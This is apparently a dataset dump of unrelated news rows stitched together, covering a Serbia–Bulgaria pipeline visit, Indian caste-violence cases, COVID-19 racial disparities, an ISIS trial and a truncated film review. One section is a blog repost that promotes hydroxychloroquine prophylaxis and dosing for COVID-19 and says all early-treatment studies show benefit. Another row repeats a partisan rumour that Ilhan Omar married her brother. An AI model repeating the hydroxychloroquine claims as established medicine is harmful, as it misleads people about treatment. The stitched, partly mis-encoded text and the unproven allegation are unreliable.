0,"Photo: Instagram/buducnostsrbijeav President of Serbia Aleksandar Vucic says that joint projects by Serbia and Bulgaria - the Belgrade-Sofia highway and the Balkan Stream gas pipeline - are essential for both countries, and he especially pointed out that, thanks to that gas pipeline, Serbia will secure gas supply in the long term. ""We visited two important joint projects, the completion of the highway from the border of the two countries and Sofia, and then we would have the Belgrade-Sofia highway, taking 3 hours. This is something that neither Serbs nor Bulgarians could even have dreamed of for many decades,"" Vucic said as he addressed journalists after touring the route of the future gas pipeline Balkan Stream in Kursumski Vodopadi together with Bulgarian PM Boyko Borisov. See what Balkan Stream looks like: He added that the construction of the Balkan Stream is essential for the future of Serbia and Bulgaria. Vucic said that he visited the works on the construction of the highway near Slivnica and Dragoman and personally saw how successfully the works are progressing and congratulated the Bulgarians. He said that he and Borisov then went to the northern part of central Bulgaria, where they toured works on the construction of Balkan Stream, which is essential for the future of Bulgaria and Serbia. ""I'm not sure that people in both countries understand the importance of that investment now. The construction of this gas pipeline will mean growth of the economy and industrial production for both countries, as well as providing gas supplies for households in the long term, which is one of the most important energy sources,"" stated Vucic. He stressed that the gas pipeline has, as he said, strategic and in-depth significance for progress of investments in both countries. ""I saw how fast works are being done and how well Bulgarians do it and I hope that in a short period of time we will complete connecting the Bulgarian gas pipeline with the Serbian gas pipeline in the territory of Zajecar,"" said Vucic and added that Serbia will soon build a gas interconnector from Nis to Bulgaria with the financial support from the EU. ""I am grateful to Boyko Borisov, because I saw more today than during all previous trips,"" Vucic stated. Vucic thanked Borisov for supporting Serbia on the European path, which, as he said, is not always easy, and added that Boyko is the holder of the highest order given by the Republic of Serbia and has an obligation to help Serbia. He thanked the prime minister of Bulgaria, who, as he said, has invested a lot of effort, energy and enthusiasm in creating best possible relations between Serbia and Bulgaria, and Serbs and Bulgarians. He stressed that Serbia perceives Bulgaria as a truly friendly country, and the Bulgarian people as brotherly The president emphasized that no one in Serbia would say a single ugly word about Bulgarians and Bulgaria, and that Serbs perceive Bulgarians as a brotherly people and Bulgaria as a friendly state. Vucic added that you will not be able to find someone in Serbia who will say something bad about Bulgaria if you looked for them with a magnifying glass. ""All this that Borisov has organized speaks sufficiently to that closeness,"" Vucic added.  Photo: Instagram/buducnostsrbijeav Prime Minister of Bulgaria Boyko Borisov pointed out today that works on the Balkan Stream gas pipeline through his country did not stop during the coronavirus crisis. The project, the Bulgarian prime minister points out, will benefit both countries while future generations will be able to benefit financially. He said the project is being implemented with the help of the European Commission, respecting all the requirements of the Third Liberalization Package, ""with applause from Belgrade, Moscow and the United States."" ""I showed the Serbian president the new expansion we are working on. We are working on two large compressor stations that will operate under 64-bar pressure. Until now, the throughput was 22 bar, and it will go up to 70 bar, so that our Serbian friends could collect transit taxes from higher throughput,"" Borisov explained in a joint address to the media with Serbian President Aleksandar Vucic after visiting the works on the gas pipeline. He pointed out that work is also being done on an interconnector with Greece, and that the entire Balkan Stream project will guarantee diversification, because Russian, American, Qatari, Turkish and gas from other parts of the world will be able to pass through the gas pipeline. Borisov pointed out that this is a fully Bulgarian investment. He recalled South Stream was stopped by Brussels due to corrupt practices in tenders, but that everything is transparent regarding Balkan Stream. In that regard, he pointed out that Greek companies, as well as a company from Saudi Arabia, are involved in the works worth 250 million euros, invested by Bulgaria, and that there are Italians, Greeks and Arabs among about 1,200 workers. He pointed out that coronavirus led to a project delay of two to three months, and announced that compressors would arrive in October for the compressor stations that they visited today. He stressed that the coronavirus took many human lives, caused great damage to the economy around the whole world, but that now is the time for Serbian and Bulgarian people to socialize and visit again. ""We didn't choose June 1, Children's Day, for this visit for nothing. We are big kids, we love to play. So we flew in a helicopter and then rode in an SUV. It was extremely pleasant. Symbolically, this abolishes the quarantine. And I hope that with all the symbolism, we will manage to forget the Covid 19 crisis,"" said Borisov. He added that it is time to return to normal life and work, stressing that during the current crisis, works on the route of the Balkan Stream did not stop.

0,"On the same day a bombshell story broke on DailyMail about a Somali community leader saying Ilhan Omar did marry her brother, and even offering details, the Minnesota lawmaker tweeted this: Paying people to generate fake new stories in order to delegitimize me and those I represent isn’t a good look. Desperation is a sad mobilizing tool.  It’s unclear if Omar was directly referencing the DailyMail story, but it sure seems like it. However it’s also curious why Omar would not simply outright deny the story’s validity if it is not true. Per TCO, In a new report from DailyMail, a Somali community leader Abdihakim Osman has come out to go on the record to speak out on the rumor of Ilhan Omar marrying her brother and he is saying she indeed did it. In addition, Osman goes into detail about how she did it in a way that kept details from the public. DailyMail reports “Squad” congresswoman Ilhan Omar told friends years ago that the man who went on to become her second husband was in fact her brother, DailyMail.com can confirm. And now for the first time one of those friends has come forward to reveal exactly how Omar and Ahmed Elmi scandalized the Somali community in Minneapolis. Abdihakim Osman is the first person to go on record to speak of how Omar said she wanted to get her brother papers so he could stay in the United States, at a time when she was married to her first husband Ahmed Hirsi. But hardly anyone realized that meant marrying him. ‘No one knew there had been a wedding until the media turned up the marriage certificate years later,’ Osman, 40, exclusively told DailyMail.com. Osman’s revelations are sure to renew calls for an investigation into the Minnesota freshman representative who has repeatedly refused to answer questions on her marriage to Elmi. She originally said the idea that the spouses were also siblings were ‘baseless, absurd rumors’, accusing journalists of Islamophobia, but has since stayed quiet. Her spokesman told DailyMail.com that Omar, 37, does not comment on her family or personal life. ‘The Congresswoman is focused on the work her constituents sent her to Washington to accomplish,’ he said. Omar married her first husband Hirsi in 2002 in a Muslim ceremony that, like many in the immigrant community, was not registered with the state. Their first child Isra was born the following year and a second followed. But in the late 2000s Elmi appeared in Minneapolis, said Osman, who referred to Hirsi by his nickname ‘Southside’ throughout the interview. ‘People began noticing that Ilhan and Southside (Hirsi) were often with a very effeminate young guy,’ Osman said, who spoke in Somali through an interpreter. ‘He was very feminine in the way he dressed — he would wear light lipstick and pink clothes and very, very, short shorts in the summer. People started whispering about him. ‘[Hirsi] and Ilhan both told me it was Ilhan’s brother and he had been living in London but he was mixing with what were seen as bad influences that the family did not like. ‘So they sent him to Minneapolis as ”rehab”.’ Osman, who runs a popular Facebook blog called Xerta Shekh, which comments on Somali issues, said that Omar kept her marriage to Elmi quiet, with no one from the Somali community invited to the wedding. He explained: ‘When [Hirsi] and Ilhan got married, a lot of people were invited. It was a big Islamic wedding uniting two large clans in the Minneapolis community. ‘I would say there were 100-150 people there.’ But, he said: ‘When she married Elmi, no one even knew about it.’ Osman said at the time Hirsi was better known than Omar among Somalis. ‘He was a footballer, he promoted a lot of Somali shows, he was very popular. ‘So the scandal was about [Hirsi’s] brother-in-law more than Ilhan’s brother.’ It has long been rumored that Omar and Elmi are brother and sister. But because of a lack of paperwork in war-torn Somalia where they were both born, positive proof of their relationship has never been uncovered. Read more here."

Excerpts in italics with my bolds. Hydroxychloroquine (HCQ) exerts antiviral effects through several mechanisms. Our initial experience suggests that HCQ could be used for prophylaxis of COVID-19 infection in health care workers (HCW) and could help to control the virus in the early disease stages. We suggest a prophylactic strategy with HCQ for autumn-winter-spring 2020-2021. Providing adequate health care is vitally important during the COVID-19 pandemic to keep morbidity and mortality low. Health care workers (HCW) are key guarantees for this process, and they must feel safe and adequately protected, which includes reliable prophylactic measures (1). Hydroxychloroquine (HCQ) could exert antiviral effects, essential for prophylaxis and early treatment of COVID-19, through several mechanisms: 1) endosomal pH increase, which inhibits SARS-CoV-2 entry through the host cells’ membranes; 2) inhibition of ACE2 cell receptor glycosylation, which impedes SARS-CoV-2-receptor binding; 3) blocking the transport of SARS-CoV-2 from early endosomes to endolysosomes, which prevents the release of viral genome; 4) immunomodulation; 5) limiting the post-viral cytokine-storm syndrome (2, 3). We share the experience of the Bulgarian Cardiac Institute (BCI) regarding the use of HCQ for prophylaxis and treatment of COVID-19 in HCW. BCI comprises seven hospitals and eight medical centers, with around 1200 HCW, covering more than two-thirds of Bulgarian territory. Since March 2020, many of our employees were in close contact with COVID-19 cases. We offered prophylaxis with HCQ 200 mg qd for 14 days to 204 of them. 76.4% of the group (156 HCW) used HCQ and none of them presented with COVID-19 symptoms. Unfortunately, out of the rest 48 HCW that refused HCQ prophylaxis, three developed symptoms and tested positive for COVID-19. During the last seven months, 38 HCW at BCI tested positive for COVID-19, half of them symptomatic. We suggested the following treatment regimen as an early home-based therapy for them: azithromycin 500 mg qd; HCQ 200 mg tid and Zn up to 50 mg qd for 14 days. 33 (86.8%) of them undertook this treatment, with symptoms abolishing between 2nd and 4th day, none of them requiring hospitalization and with a negative PCR on 14th day for all. In conclusion, our experience at BCI suggests that HCQ could possibly provide protection against infection with SARS-CoV-2 (prophylaxis), and could, if used early, help control the COVID-19 infection (treatment).  Based on this experience, we at BCI adopted a new prophylactic strategy for HCW starting from the 2nd half of October 2020. This includes alternative months of HCQ intake (200 mg qd) and months without therapy. We are planning to continue this prophylaxis regimen throughout the autumn, winter, and spring months. Article is HCQ is effective for COVID-19 when used early: analysis of 118 studies. Excerpts in italics with my bolds. •Early treatment is most successful, with 100% of studies reporting a positive effect and an estimated reduction of 63% in the effect measured (death, hospitalization, etc.) using a random effects meta-analysis, RR 0.37 [0.30-0.47].•100% of Randomized Controlled Trials (RCTs) for early, PrEP, or PEP treatment report positive effects, the probability of this happening for an ineffective treatment is 0.002.•There is evidence of bias towards publishing negative results. Significantly more retrospective studies report negative results compared to prospective studies, p = 0.04.•Significantly more studies in North America report negative results compared to the rest of the world, p = 0.002. Figure 2: Treatment stages. Figure 2 shows stages of possible treatment for COVID-19. Pre-Exposure Prophylaxis (PrEP) refers to regularly taking medication before being infected, in order to prevent or minimize infection. In Post-Exposure Prophylaxis (PEP), medication is taken after exposure but before symptoms appear. Early Treatment refers to treatment immediately or soon after symptoms appear, while Late Treatment refers to more delayed treatment. Table 1. Results by treatment stage. 2 studies report results for a subset with early treatment, these are not included in the overall results. Publication bias. Publishing is often biased towards positive results, which we would need to adjust for when analyzing the percentage of positive results. Studies that require less effort are considered to be more susceptible to publication bias. Prospective trials that involve significant effort are likely to be published regardless of the result, while retrospective studies are more likely to exhibit bias. For example, researchers may perform preliminary analysis with minimal effort and the results may influence their decision to continue. Retrospective studies also provide more opportunities for the specifics of data extraction and adjustments to influence results. For HCQ, 87.5% of prospective studies report positive effects, compared to 69.8% of retrospective studies, two-tailed z test 2.07, p = 0.04, indicating a bias toward publishing negative results. The lack of bias towards positive results is not very surprising. Both negative and positive results are very important given the current use of HCQ for COVID-19 around the world, evidence of which can be found in the studies analyzed here, government protocols, and news reports, for example [AFP, AfricaFeeds, Africanews, Afrik.com, Al Arabia, Al-bab, Anadolu Agency, Anadolu Agency (B), Archyde, Barron’s, Barron’s (B), BBC, Belayneh, A., CBS News, Challenge, Dr. Goldin, Efecto Cocuyo, Expats.cz, Face 2 Face Africa, France 24, France 24 (B), Franceinfo, Global Times, Government of China, Government of India, GulfInsider, Le Nouvel Afrik, LifeSiteNews, Medical World Nigeria, Medical Xpress, Medical Xpress (B), Middle East Eye, Ministerstva Zdravotnictví, Morocco World News, Mosaique Guinee, Nigeria News World, NPR News, Oneindia, Pan African Medical Journal, Parola, Pilot News, Pleno.News, Q Costa Rica, Rathi, Russian Government, Teller Report, The Africa Report, The Australian, The BL, The East African, The Guardian, The Indian Express, The Moscow Times, The North Africa Post, The Tico Times, Ukraine Ministry of Health Care, Ukrinform, Vanguard, Voice of America]. We also note a bias towards publishing negative results by certain journals and press organizations, with scientists reporting difficulty publishing positive results [Boulware, Meneguesso]. Although 88 studies show positive results, The New York Times, for example, has only written articles for studies that claim HCQ is not effective [The New York Times, The New York Times (B), The New York Times (C)]. As of September 10, 2020, The New York Times still claims that there is clear evidence that HCQ is not effective for COVID-19 [The New York Times (D)]. As of October 9, 2020, the United States National Institutes of Health still recommends against HCQ for both hospitalized and non-hospitalized patients [United States National Institutes of Health]. Treatment details. We focus here on the question of whether HCQ is effective or not for COVID-19. Significant differences exist based on treatment stage, with early treatment showing the greatest effectiveness. 100% of early treatment studies report a positive effect, with an estimated reduction of 63% in the effect measured (death, hospitalization, etc.) in the random effects meta-analysis, RR 0.37 [0.30-0.47]. Many factors are likely to influence the degree of effectiveness, including the dosing regimen, concomitant medications such as zinc or azithromycin, precise treatment delay, the initial viral load of patients, and current patient conditions.  News website Panorama.it has launched a petition to get the drug hydroxychloroquine officially reinstated so that Italian doctors can once again use it with patients. If not, some of them will go ahead and use it anyway. The retracted Lancet study and trials using lethal doses(!) of HCQ were enough to get it officially banned in Italy as in other countries. Except the Italian Medicines Agency (AIFA) has not yet reapproved it, despite studies showing its effectiveness. Here are excerpts of the Change.org petition translated from Italian: At the moment there are no treatments of proven effectiveness to be administered at home. Because the only therapy that AIFA (Italy’s Medicines Agency) had authorized at home, the one based on hydroxychloroquine, has been blocked. It happened on May 26, after the publication of a study in The Lancet, which was withdrawn 13 days later. Meanwhile, German GPs, who had administered 1,060,000 doses of hydroxychloroquine in March, continued to prescribe it. In the United States, three states lifted the ban on the drug in early August. In China, on August 19, the National Health Commission’s guidelines continued to recommend the active ingredient for Covid 19 patients. And on September 21, The Lancet itself retraced its steps, with a study claiming that hydroxychloroquine reduces mortality. In order to save lives, we ask AIFA to restore the use of hydroxychloroquine for home patients in the very early stages of the disease, possibly even with an emergency procedure. Otherwise, we invite the Agency to provide shared protocols of treatment practicable in the territory. via Science Matters https://ift.tt/3lBkm1m November 13, 2020 at 05:35PM Fill in your details below or click an icon to log in: You are commenting using your WordPress.com account.

0,"Chief Minister YS Jagan Mohan Reddy has initiated a probe into the incident. A Dalit man died in police custody on Tuesday late night in Prakasam district after he was detained by the police allegedly for not wearing a face mask while riding on a motorcycle. The deceased Yericharla Kiran was undergoing treatment for a head injury in Guntur. However, he succumbed to his injuries. On July 18, Kiran was detained by the police for not wearing a mask and helmet in a COVID-19 hotspot of Chirala town in Prakasam district. According to police, Kiran and his friend Shini Abraham were moving on a motorcycle without masks and a constable Rami Reddy at Kothapeta check-post reprimanded them. Police allegedly found that the duo were in an inebriated condition. Police in a press note said that the duo created a ruckus and allegedly beat up the constable following which Sub-Inspector (SI) Vijay Kumar took them into custody. Police claim that Kiran jumped out of the moving police vehicle while being taken to the II Town police station, resulting in a head injury. The family members of the deceased allege that the police hit him on his head causing the fatal injury. Police said that Kiran was first shifted to the Chirala Government hospital and later to a private hospital in Guntur for better treatment. The incident has caused a furore in the state over repeated police violence against Dalits in the past two days. TDP general secretary Nara Lokesh, slamming the YSRCP government said, âDonât Dalits have a right to live under Jaganâs regime?â Pointing out the cases of Varaprasad and Kiran, he said, âTo gain the appreciation of the ruling party leaders, police had tortured Varaprasad and now a Dalit youth Kiran Kumar in Prakasam district died due to police assault. Is there law and order in this state? The police who ought to protect the citizens have turned into lackeys of the ruling party and are attacking the Dalits like goondas.â Varaprasad, a Dalit man was tonsured and humiliated by the SI in Seethanagaram police in East Godavari district, allegedly at the behest of the local YSRCP leaders, over a feud involving a sand lorry. Meanwhile, on Wednesday, tension prevailed in Thomaspeta area of Chirala following Kiranâs death. Police deployed additional forces to prevent any untoward incident. Probe Initiated Kiranâs father Mohan filed a complaint against SI Vijay Kumar following which he was booked under IPC Section 324 (voluntarily causing hurt by dangerous weapons or means). Chief Minister YS Jagan Mohan Reddy initiated an inquiry into the incident and announced an ex gratia of Rs 10 lakh to the victimâs family. The inquiry would be led by Additional Superintendent of Police Gangadhar. Prakasam District Superintendent of Police Siddharth Kaushal handed over the case to Darsi Deputy Superintendent of Police for an impartial probe.  ©2021 the news minute"
0,"Stark statistics from Chicago health officials have underscored the heavy toll of coronavirus on black Americans. Black Chicagoans account for half of all coronavirus cases in the city and more than 70% of deaths, despite making up 30% of the population. Other cities with large black populations, including Detroit, Milwaukee, New Orleans and New York, have become coronavirus hotspots. The US has recorded nearly 370,000 virus cases and almost 11,000 deaths. Globally there have been nearly 75,000 deaths and more than 1.3m cases total. As of 5 April, 1,824 out of Chicago's 4,680 confirmed Covid-19 cases were black residents, said city officials on Monday. That compared with 847 white, 478 Hispanic and 126 Asian Chicagoans. Chicago has seen a total of 98 deaths as of Sunday, with 72% of them black residents. The disparity is reflected across the state, where black people account for 41% of Covid-19 deaths, despite making up 14% of the population of Illinois. Chicago public health commissioner Dr Allison Arwady told reporters that black city residents already lived on average about 8.8 years less than their white counterparts. Mayor Lori Lightfoot said the coronavirus was ""devastating black Chicago"". She said city inspectors would be sent into shops to ensure everyone was adhering to social distancing guidelines. Mayor Lightfoot also raised the possibility of curfews in areas where people gathered outside liquor stores, reports the Chicago Sun-Times. Though the coronavirus has been called the ""great equalizer"", data suggests that vulnerability to the infection may vary by neighbourhood. In Michigan, African Americans make up 14% of the population, but they account for 33% of the coronavirus cases and 41% of deaths, figures from the state health department showed on Monday. White residents account for about 23% of recorded cases in Michigan and 28% of deaths, according to the data. This video can not be played Detroit, Michigan, is about 80% black, and the city together with its surrounding suburbs accounts for around 80% of confirmed coronavirus cases. A similar disparity has emerged in Milwaukee, Wisconsin, one of the most segregated cities in the US. African Americans made up almost half of Milwaukee County's nearly 1,000 cases as of last Friday and 81% of its 27 deaths, despite black people accounting for 26% of the population there, according to a study by ProPublica. In hard-hit Louisiana, more than 70% of the people who have died of Covid-19 are black, despite African Americans making up 32% of the Gulf state's population. Some 40% of Louisiana's coronavirus deaths have occurred in the New Orleans area, where the majority of residents are black. Health officials have previously said the Big Easy's residents suffer from rates of obesity, diabetes and hypertension that are higher than the national average, making them more vulnerable to Covid-19. Mayor Lightfoot said diabetes, heart disease and respiratory illness were ""really prevalent"" in black communities. Dr Arwady told reporters that even if everyone in the city did have access to a doctor, ""we would still see significant health disparities because of food deserts and lack of walkable streets"". This video can not be played Dr Cameron Webb, an African-American physician who is running for Congress in the US state of Virginia, told BBC News that US racial and economic disparities were being amplified by the pandemic. ""It really exposes our society's fault lines,"" he said. Alderman Jason Ervin, who chairs Chicago council's black caucus, told the Chicago Tribune that ""rates of non-compliance in some parts of the city with the stay-at-home orders"" might also be contributing to the statistics.

Published: 30th August 2020 08:55 AM | Last Updated: 30th August 2020 08:55 AM | A+A A- Commissioner of Police Manish Kumar Sinha addressing a news conference in Vizag. (Photo | Express) VISAKHAPATNAM: Even before the heat generated by the tonsuring case in East Godavari district died down, yet another such incident was reported in Visakhapatnam. However, the city police acted with alacrity and arrested seven persons involved in the incident. Speaking to mediapersons here on Saturday, Police Commissioner Manish Kumar Sinha said following a complaint lodged by the victim P Srikanth, the police investigated the case and arrested the accused, including the wife of Big Boss (Telugu) fame Nutan Naidu. He said they seized the footage of CCTV camera in the house and based on the evidence, cases under the SC and ST (Prevention of Atrocities) Act and other Sections of the IPC were filed against the accused. The police arrested Nutan Naidu’s wife N Priya Madhuri, T Indira Rani (26), housekeeping supervisor, Ch Varahalu (35), supervisor, I Ravi Kumar (26), a barber, S Balagangadhar (29), M Jhansi (19) and M Sowjanya (29), staff at Nutan Naidu’s house, on charges of assaulting and tonsuring the 20-year-old Dalit youth. The CCTV footage reportedly revealed that the accused thrashed and tonsured Srikanth. The Police Commissioner said Srikanth worked as a housekeeping boy at Nutan Naidu’s house for six months till he quit the job on August 1. On August 27, Varahalu asked him to come to the house. When Srikanth went to the house, Priya Madhuri allegedly accused him of stealing her iPhone. Srikanth, who refuted the charge, came back from the house. However, Varahalu again asked him to come to the house on Friday. Srikanth was allegedly abused and thrashed by some of the inmates and staff with sticks and steel rods. Later, the accused called Ravi Kumar, who tonsured Srikanth. They allegedly threatened him not to reveal the incident to anyone. After tonsuring Srikanth, a few of the accused reportedly took selfies with him and later they deleted them. However, their mobile phones were seized by the police and the deleted data was retrieved. The police registered cases under Sections of attempt to murder (307), voluntarily causing hurt by dangerous weapons (324), and various other Sections, including 342, 324, 323, 506 r/w 34 of IPC and 3(1)(e) and 3(2)(v) of the SC, ST Act. Manish Kumar Sinha said further investigation into the case would reveal if there was any other intention in attacking Srikanth. Narrating his harrowing experience, Srikanth said he was targeted and beaten up as he quit the job in their house. He said they refused to listen to his pleas that he did not steal the mobile phone as alleged. He said he left the house 28 days ago and was not aware of the mobile and denied that he had scanned the photos of Indira. Based on his complaint, Pendurthi police acted swiftly in the tonsuring case, the Police Commissioner said. O P E N Disclaimer : We respect your thoughts and views!

These are some of our most ambitious editorial projects. Enjoy! Our emails are made to shine in your inbox, with something fresh every morning, afternoon, and weekend. Africa editor Last year, Africa had some of world’s fastest-growing economies and 2020 won’t be very different. A few of the countries on the top 10 list may have changed but the IMF, World Bank and other institutions all expect above global average GDP growth. The top performers will be South Sudan (8.2%), Rwanda (8.1%) Côte d’Ivoire (7.3%), Ethiopia (7.2%), Senegal (6.8%), Benin (6.7%) and Uganda (6.2%) along with Kenya, Mozambique, Niger and Burkina Faso all expecting 6% growth. While these countries help push up Africa’s overall average economic growth rate forecast to 3.8% (or 3.6% for Sub Saharan Africa), these averages are weighed down closer to the global average (3.4%) by the two largest economies, Nigeria (2.5%) and South Africa (1.1%). Nigeria’s outlook has improved after a strong end to 2019, but most economic watchers believe it needs to grow much faster to pull large chunks of its 200-million strong population out of poverty. Economic reform has been slower than expected since February 2019’s presidential election. South Africa’s meager growth rates are exacerbated by its ongoing electricity crisis and overall political stasis. Its leaders will likely spend part of the year dreading an inevitable debt downgrade. Since 2020 is seen as the start of a new decade, Brookings Institution’s annual Foresight Africa report looked at the average economic growth forecasts for the next five years till 2024. This predicts Senegal (8.3%), Rwanda (7.9%), Niger (7.3% ), Uganda (7.2%) and Mozambique (6.9%) as the five fastest growing over that period. While these forecasts are promising, most economists and investors are paying more attention to how the reality of climate change will impact their economic prognostications. Brookings highlights research which shows lowered crop yields, lower labor and agricultural productivity and damage to human health due to climate change will significantly decrease GDP in Africa. Global temperatures rising as much as 3°C by 2100 would have a disproportionate impact on Africa with aggregate GDP potentially dropping by as much as 8.6% after that year. But on a more hopeful note Brookings analysts say there’s a $16 billion opportunity if African countries fully implement the African Continental Free Tree Agreement (AfCFTA). In the ideal scenario where there’s a 100% liberalization of tariffs across African member states under the agreement, the continent’s aggregate GDP would jump to $3 trillion by 2030 from $2.1 trillion today. In this scenario there would be a 33% increase in intra-African exports and 1.2% increase in employment. One less optimistic economic highlight from the last few years has been growing concern about Africa’s rising debt and this continues into 2020. Most of the worry has been about eurobond debt with African countries issuing some $26 billion in eurobonds in 2019 more or less equivalent to 2018. Or, put another way, Africa issued more eurobonds in 2018 and 2019 that it did in all the years combined from 2003 to 2016. While African eurobonds have been great for international investors seeking higher yields away from US treasuries, “the scale of issuance keeps prompting questions about default even though it amounted to just 1% of Africa’s 2019 GDP ($2.4 billion),” writes Charles Robertson of Renaissance Capital. But of course, Africa is not a country and there will be trouble spots if care is not taken. 🌍 Keep up with developments and emerging industries in Africa.

0,"A video of a man and a woman paraded naked while a crowd records their video is circulating on social media. Hushyar Singh Meena (@HushyarMeenaIN) who identifies as ABVP Jaipur state secretary posted the video on June 26 and wrote, “It is being said that this incident took place in Deoria’s Sakrapar. Son and daughter of a Dalit were stripped naked and beaten. The youth were beaten only because they did not come on time to cut the harvest. The accused should be punished irrespective of where this video is from.” Alt News is refraining from embedding the video in this article due to its distressing nature. A screenshot has been attached below. [Translated from: ये देवरिया के सकरापार कि घटना बताई है. दलित के लड़के और लड़की को निर्वस्त्र कर मार रहे है. फसल काटने नही आए सिर्फ इसलिए युवक और युवती को निर्दयता से निर्वस्त्र कर पिटाई की गई. ये वीडियो कही का भी हो दोषियों के खिलाफ कार्यवाही होनी चाहिए.]  The clip is circulating on Facebook and Alt News has also received several fact-check requests.  This video dates back to April 2017. Alt News has already debunked it in the past. As reported by Hindustan Times, the incident took place in Shambhupura village in Banswara district of Rajasthan. After a Khap like diktat was issued, Kachru (20) and his cousin with whom he was allegedly in a relationship were thrashed and paraded naked in the village. Both the victims belonged to the Bhil tribal community of Rajasthan. “The police said that a case has been registered under relevant sections of the IPC and the Information Technology act against five individuals and around 10-12 unidentified persons,” added the report.  During a Mirror Now broadcast, SP Anand Kumar stated, “A girl and a boy from the same family eloped a few days earlier. Since it was a family affair, they did not inform the police and began a search operation on their own. They were eventually found in Gujarat yesterday, and around 10-11 am they were brought back to the village. No one was informed and they were stripped and thrashed. No one was aware of the incident and the boy was returned to his family while the girl was married off immediately. A WhatsApp video and photos came to the fore, after which the SHO went to the village and spoke to the sarpanch. No one was willing to talk initially but after digging a little it was found that the incident indeed took place. The police traced the boy and has taken him in confidence. He was reluctant to give details at first but eventually filed an FIR. ” Therefore, a video of a 2017 incident from Rajasthan was revived with the false claim that a girl and boy from a Dalit family were mercilessly thrashed. However, this was a case of honour-based violence as the couple, who were relatives, eloped together.

Four caste men allegedly gangraped a 19-year-old Dalit woman in Hathras district of Uttar Pradesh on September 14, The Times of India reported on Thursday. The woman had to be admitted to the intensive care unit of a hospital after suffering serious injuries. The woman told the police in a statement on September 22 that the four men raped her on September 14 when she had gone to collect firewood. She is still in ICU but out of danger. Last week, based on a complaint by the woman’s brother, the police had booked a man identified as Sandeep for attempted murder, under the Scheduled Caste and Scheduled Tribes (Prevention of Atrocities) Act. The family alleged Sandeep had tried to kill the woman over some old enmity. The police arrested the accused and he was remanded in judicial custody. Hathras Superintendent of Police Vikrant Vir said on Thursday that after the woman’s statement, gang rape charges were added to the first information report and three persons were booked. “One accused has been held and the others, too, will be soon arrested,” he told The Times of India. Additional Superintendent of Police Prakash Kumar said the police will file the chargesheet soon. Meanwhile, Uttar Pradesh Congress Committee Vice President Deepak Kumar met the woman and alleged that the accused were threatening her and her family. He said he will give a detailed report on the matter to party General Secretary Priyanka Gandhi and State President Ajay Kumar Lallu. Congress leader Shyoraj Jivan Valmiki met the complainant’s family members and demanded action against the police officers for the delay in recording her statement. He said that no injustice to members of the Dalit community would be tolerated. Earlier this month, a three-year-old girl was gangraped and killed in a sugarcane field in Uttar Pradesh’s Lakhimpur Kheri district. On August 28, a man in Uttar Pradesh’s Maharajganj district raped and murdered a 12-year-old girl and left her body in a forest. The accused took the child to eat snacks on his bicycle on Friday evening. After that, he took her to a forest, raped her and strangled her. The accused, then, returned to the village. He has been arrested. On August 24, a 17-year-old girl was found dead near her house in the same district. The police said the minor was raped before being killed with a sharp weapon. On August 14, a 13-year-old Dalit girl was allegedly raped and murdered in the district. The body of the girl, who was strangled with her tongue allegedly cut, was found in a sugarcane field owned by one of the accused. The police have arrested four men in connection with the case under charges of gang rape and murder."
0,"An Iraqi suspected of belonging to Islamic State will face charges of murder and genocide, German prosecutors said on Friday, accused especially of letting a five-year-old “slave” girl die of thirst. Taha A.-J. is the husband of Jennifer W., a woman who has been on trial in Munich since last year over accusations that the two mistreated a Yazidi mother and daughter, before allowing the young girl to die. The case against the couple has been described by media and lawyers as the first time worldwide that an ISIS member has been tried for crimes against the Yazidis, a religious minority which suffered brutal persecution at the hands of the Islamic State from 2014. Prosecutors allege that A.-J., who joined ISIS in 2013, purchased the Yazidi child and her mother as household “slaves” and held them captive while living with Jennifer W. in then ISIS-occupied Mosul, Iraq, in 2015. Their actions were aimed at “destroying the Yazidis, their religion and their culture in keeping with the aims of ISIS,” the prosecutors’ statement said. The couple are alleged to have forced the mother and daughter to convert to Islam, starved them of food and water and subjected them to beatings. A.-J. ultimately chained the five-year-old girl to a window outdoors in heat mounting to 50 degrees Celsius (122 Fahrenheit), leading her to die of thirst, according to the case. “The accused thought it possible that the girl would die and recklessly took that into account,” prosecutors said. Arrested in Greece in May 2019 and in detention in Germany since October, A.-J. has also been charged with war crimes, crimes against humanity and human trafficking for labour exploitation. Jennifer W. has been on trial in Munich since April. Recruited to ISIS in mid-2015, she was later arrested in Turkey and extradited back to Germany, but not convicted. She was arrested again in June 2018 after speaking about the Yazidi child’s death to an undercover police informant, who she believed would help her return to ISIS territory. Prominent London-based human rights lawyer Amal Clooney is part of the team representing the dead Yazidi girl’s mother, who is a co-plaintiff in the case. Clooney has been involved in a campaign with Nobel Peace Prize winner Nadia Murad, a former ISIS sex slave, to have the ISIS crimes against the Yazidi minority be recognized as a genocide.

0,"Courtesy: Fox 13 CLEARWATER, Fla. (AP/WSVN) — A private archaeology firm says it has discovered what appear to be about 44 graves from a long-forgotten African American cemetery under a Florida parking lot. The Tampa Bay Times reports that the firm, Cardno, used ground-penetrating radar to find the suspected graves. The firm was hired by the city of Clearwater and the Pinellas County School Board to conduct the search. The school district owns the parking lot. Cardno also reported additional graves may exist under a nearby school district building. According to Fox 13, the graves were found underneath a former elementary school. The discovery is the third since August in which archaeologists have discovered lost African American graves in the Tampa Bay region. In the latest find, officials say the original cemetery was moved in 1954 but that some graves were left behind. Officials say Cardno will get permission to validate the radar’s findings by digging just close enough to the graves to confirm their existence without touching them. Additional findings are expected by the end of March. After that, community meetings will be held to discuss what to do. Copyright 2021 The Associated Press. All rights reserved.

0," The initial visuals of the film themselves convince the audience about the upperhand, the Tamil Brahmin heroine has over the hero hailing from an OBC community. The forced abstention from alcohol and his transformation are a part of preparing him for the marriage. We see the hero cancelling his order for his favourite beef dish, solely considering her dislike (although she doesn’t express it verbally).  The short film directed by Dina Chandra Mohan, “Modi and a Beer”, presented by Pa Ranjith’s Neelam Productions was released in Youtube recently on June 1, 2020. The film discusses its politics through the unfolding dialogue between Sruthi and Arun, a couple in love representing distinct caste identities, who are preparing to get married with their parents’ consent. The film runs its course within the ambit of their dialogue. The narrative takes off, as Arun enjoys his ‘last’ beer bottle with a vegan and teetotaler Sruthi, who had persuaded him to quit drinking. However, in no time, the innocent chitchat develops into a power- related tugs of war. The initial visuals of the film themselves convince the audience about the upperhand, the Tamil Brahmin heroine has over the hero hailing from an OBC community. The forced abstention from alcohol and his transformation are a part of preparing him for the marriage. We see the hero cancelling his order for his favourite beef dish, solely considering her dislike (although she doesn’t express it verbally). “One of the merits of alcohol is that, it dissolves the systems. It creates a predicament whereby it becomes impossible to lie after thinking twice. We are determined that a liquor shop must be a hundred metres away from civilization, because it can otherwise expose the fragile truths of a community. Is there anything we detest like truth?”- asked Prof. M.N. 